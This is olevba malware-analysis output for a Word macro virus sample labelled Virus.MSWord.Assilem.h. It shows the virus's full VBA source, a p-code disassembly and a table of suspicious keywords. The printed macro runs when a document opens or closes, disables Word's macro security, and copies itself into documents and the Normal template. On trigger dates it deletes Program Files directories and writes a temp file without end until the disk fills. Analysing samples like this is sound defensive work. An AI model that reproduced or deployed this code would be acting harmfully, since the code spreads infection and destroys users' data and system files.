olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SRAT.cls 
in file: Virus.MSWord.Assilem.h - OLE stream: 'Macros/VBA/SRAT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (19 - 19)
    Options.VirusProtection = (19 - 19)
    Options.SaveNormalPrompt = (19 - 19)
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "SRAT") <> "by Kwyjiboymi" Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "SRAT") = "by Kwyjiboymi"
End If
Dim ADVBPVBCI1, ADCMCLs%, DoAD As Boolean, myBgnL%
Dim NTVBPVBCI1, NTCMCLs%, DoNT As Boolean, ToInfect, SRATFill As Boolean
Set ADVBPVBCI1 = ActiveDocument.VBProject.VBComponents.Item(1)
ADCMCLs = ADVBPVBCI1.CodeModule.CountOfLines
If ADVBPVBCI1.Name <> "SRAT" Then
    If ADCMCLs > 0 Then ADVBPVBCI1.CodeModule.DeleteLines 1, ADCMCLs
    Set ToInfect = ADVBPVBCI1
    ADVBPVBCI1.Name = "SRAT"
    DoAD = True
End If
Set NTVBPVBCI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCMCLs = NTVBPVBCI1.CodeModule.CountOfLines
If NTVBPVBCI1.Name <> "SRAT" Then
    If NTCMCLs > 0 Then NTVBPVBCI1.CodeModule.DeleteLines 1, NTCMCLs
    Set ToInfect = NTVBPVBCI1
    NTVBPVBCI1.Name = "SRAT"
    DoNT = True
End If
myBgnL = 2
If DoNT = True Then
    Do While ADVBPVBCI1.CodeModule.Lines(1, 1) = ""
        ADVBPVBCI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
    Do While ADVBPVBCI1.CodeModule.Lines(myBgnL, 1) <> ""
        ToInfect.CodeModule.InsertLines myBgnL, ADVBPVBCI1.CodeModule.Lines(myBgnL, 1)
        myBgnL = myBgnL + 1
    Loop
End If
If DoAD = True Then
    Do While NTVBPVBCI1.CodeModule.Lines(1, 1) = ""
        NTVBPVBCI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
    Do While NTVBPVBCI1.CodeModule.Lines(myBgnL, 1) <> ""
        ToInfect.CodeModule.InsertLines myBgnL, NTVBPVBCI1.CodeModule.Lines(myBgnL, 1)
        myBgnL = myBgnL + 1
    Loop
End If
If NTCMCLs <> 0 And ADCMCLs = 0 And (InStr(1, ActiveDocument.Name, "Document") = 0) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") > 0) Then
    ActiveDocument.Saved = True
End If
If Day(Now) = 19 Then
    SRATFill = True
    GoTo SRATAct1
End If
If Day(Now) = Second(Now) Then GoTo SRATAct1
Exit Sub
SRATAct1:
    Dim f%, k%, myp, tmp, mys$
    Randomize
    mys = " (¥) "
    Selection.TypeText " is it safe? (y/n)" & vbCrLf
    myp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProgramFilesPath") & "\"
    k = Rnd * 19 + 1
    tmp = Dir(myp, vbDirectory)
    Do While f < k And tmp <> ""
        If tmp <> "." And tmp <> ".." Then
            tmp = myp & tmp
            RmDir tmp
            Selection.TypeText mys
        End If
        f = f + 1
        tmp = Dir
    Loop
    k = k - 2
    Selection.TypeText "your lucky number is " & k & " ! "
    If k > 0 Then Selection.TypeText "by the way, each" & mys & "represents a dead directory! guess what " & k & " means! anyway, tell me about yourself.." & mys & "(SRAT)"
    If SRATFill = True Then GoTo SRATAct2
    Exit Sub
SRATAct2:
    tmp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot") & "\temp\srat.19"
    Open tmp For Output As #1
    If Err Then Open "c:\temp\srat.19" For Output As #1
    Do
       Print #1, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys
    Loop
    Close #1
Exit Sub
'WORD/SRAT written by Kwyjiboymi
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Assilem.h
' ===============================================================================
' Module streams:
' Macros/VBA/SRAT - 7138 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	ElseBlock 
' Line #6:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	LitDI2 0x0013 
' 	LitDI2 0x0013 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	LitDI2 0x0013 
' 	LitDI2 0x0013 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitDI2 0x0013 
' 	LitDI2 0x0013 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "SRAT"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000D "by Kwyjiboymi"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	LitStr 0x000D "by Kwyjiboymi"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "SRAT"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Dim 
' 	VarDefn ADVBPVBCI1
' 	VarDefn ADCMCLs
' 	VarDefn DoAD (As Boolean)
' 	VarDefn myBgnL
' Line #15:
' 	Dim 
' 	VarDefn NTVBPVBCI1
' 	VarDefn NTCMCLs
' 	VarDefn DoNT (As Boolean)
' 	VarDefn ToInfect
' 	VarDefn SRATFill (As Boolean)
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADVBPVBCI1 
' Line #17:
' 	Ld ADVBPVBCI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCMCLs 
' Line #18:
' 	Ld ADVBPVBCI1 
' 	MemLd New 
' 	LitStr 0x0004 "SRAT"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	Ld ADCMCLs 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCMCLs 
' 	Ld ADVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #20:
' 	SetStmt 
' 	Ld ADVBPVBCI1 
' 	Set ToInfect 
' Line #21:
' 	LitStr 0x0004 "SRAT"
' 	Ld ADVBPVBCI1 
' 	MemSt New 
' Line #22:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTVBPVBCI1 
' Line #25:
' 	Ld NTVBPVBCI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCMCLs 
' Line #26:
' 	Ld NTVBPVBCI1 
' 	MemLd New 
' 	LitStr 0x0004 "SRAT"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld NTCMCLs 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCMCLs 
' 	Ld NTVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #28:
' 	SetStmt 
' 	Ld NTVBPVBCI1 
' 	Set ToInfect 
' Line #29:
' 	LitStr 0x0004 "SRAT"
' 	Ld NTVBPVBCI1 
' 	MemSt New 
' Line #30:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	LitDI2 0x0002 
' 	St myBgnL 
' Line #33:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld ADVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #36:
' 	Loop 
' Line #37:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #38:
' 	Ld myBgnL 
' 	LitDI2 0x0001 
' 	Ld ADVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #39:
' 	Ld myBgnL 
' 	Ld myBgnL 
' 	LitDI2 0x0001 
' 	Ld ADVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	Ld myBgnL 
' 	LitDI2 0x0001 
' 	Add 
' 	St myBgnL 
' Line #41:
' 	Loop 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #45:
' 	LitDI2 0x0001 
' 	Ld NTVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #46:
' 	Loop 
' Line #47:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #48:
' 	Ld myBgnL 
' 	LitDI2 0x0001 
' 	Ld NTVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #49:
' 	Ld myBgnL 
' 	Ld myBgnL 
' 	LitDI2 0x0001 
' 	Ld NTVBPVBCI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #50:
' 	Ld myBgnL 
' 	LitDI2 0x0001 
' 	Add 
' 	St myBgnL 
' Line #51:
' 	Loop 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld NTCMCLs 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCMCLs 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	ElseIfBlock 
' Line #56:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitVarSpecial (True)
' 	St SRATFill 
' Line #60:
' 	GoTo SRATAct1 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo SRATAct1 
' 	EndIf 
' Line #63:
' 	ExitSub 
' Line #64:
' 	Label SRATAct1 
' Line #65:
' 	Dim 
' 	VarDefn False
' 	VarDefn k
' 	VarDefn myp
' 	VarDefn tmp
' 	VarDefn mys
' Line #66:
' 	ArgsCall Read 0x0000 
' Line #67:
' 	LitStr 0x0005 " (¥) "
' 	St mys 
' Line #68:
' 	LitStr 0x0012 " is it safe? (y/n)"
' 	Ld vbCrLf 
' 	Concat 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #69:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0010 "ProgramFilesPath"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St myp 
' Line #70:
' 	Ld Rnd 
' 	LitDI2 0x0013 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #71:
' 	Ld myp 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St tmp 
' Line #72:
' 	Ld False 
' 	Ld k 
' 	Lt 
' 	Ld tmp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	DoWhile 
' Line #73:
' 	Ld tmp 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld tmp 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	IfBlock 
' Line #74:
' 	Ld myp 
' 	Ld tmp 
' 	Concat 
' 	St tmp 
' Line #75:
' 	Ld tmp 
' 	ArgsCall RmDir 0x0001 
' Line #76:
' 	Ld mys 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld False 
' 	LitDI2 0x0001 
' 	Add 
' 	St False 
' Line #79:
' 	Ld Dir 
' 	St tmp 
' Line #80:
' 	Loop 
' Line #81:
' 	Ld k 
' 	LitDI2 0x0002 
' 	Sub 
' 	St k 
' Line #82:
' 	LitStr 0x0015 "your lucky number is "
' 	Ld k 
' 	Concat 
' 	LitStr 0x0003 " ! "
' 	Concat 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #83:
' 	Ld k 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "by the way, each"
' 	Ld mys 
' 	Concat 
' 	LitStr 0x0028 "represents a dead directory! guess what "
' 	Concat 
' 	Ld k 
' 	Concat 
' 	LitStr 0x0028 " means! anyway, tell me about yourself.."
' 	Concat 
' 	Ld mys 
' 	Concat 
' 	LitStr 0x0006 "(SRAT)"
' 	Concat 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #84:
' 	Ld SRATFill 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo SRATAct2 
' 	EndIf 
' Line #85:
' 	ExitSub 
' Line #86:
' 	Label SRATAct2 
' Line #87:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000D "\temp\srat.19"
' 	Concat 
' 	St tmp 
' Line #88:
' 	Ld tmp 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #89:
' 	Ld Err 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "c:\temp\srat.19"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	EndIf 
' Line #90:
' 	Do 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemComma 
' 	Ld mys 
' 	PrintItemNL 
' Line #92:
' 	Loop 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #94:
' 	ExitSub 
' Line #95:
' 	QuoteRem 0x0000 0x001F "WORD/SRAT written by Kwyjiboymi"
' Line #96:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

